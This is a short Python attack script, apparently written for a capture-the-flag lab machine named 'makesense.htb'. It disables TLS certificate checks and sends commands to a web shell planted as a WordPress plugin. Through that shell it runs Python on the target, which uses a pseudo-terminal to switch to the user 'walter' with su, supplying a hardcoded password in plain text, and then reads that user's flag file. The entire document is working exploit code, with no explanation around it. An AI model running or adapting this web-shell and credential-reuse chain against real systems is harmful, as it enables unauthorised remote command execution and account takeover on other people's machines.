import urllib.request
import urllib.parse
import ssl
import sys

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# Python code to execute on target to run command as walter using su/pty
py_code = """
import pty, os, time, sys

master, slave = pty.openpty()
pid = os.fork()

if pid == 0:
    os.close(master)
    os.dup2(slave, 0)
    os.dup2(slave, 1)
    os.dup2(slave, 2)
    os.close(slave)
    os.execv('/bin/su', ['su', 'walter', '-c', 'id; cat /home/walter/user.txt'])
else:
    os.close(slave)
    time.sleep(0.3)
    os.write(master, b'JbhHDAEgXvri3!\\n')
    time.sleep(0.5)
    output = b''
    while True:
        try:
            chunk = os.read(master, 1024)
            if not chunk: break
            output += chunk
        except Exception:
            break
    print(output.decode('utf-8', errors='ignore'))
"""

cmd = f"python3 -c {urllib.parse.quote(repr(py_code))}"
url = "https://makesense.htb/wp-content/plugins/shell/shell.php?" + urllib.parse.urlencode({'cmd': f"python3 -c {repr(py_code)}"})

req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
res = urllib.request.urlopen(req, context=ctx).read().decode('utf-8', errors='ignore')
print(res.replace('<pre>', '').replace('</pre>', '').strip())
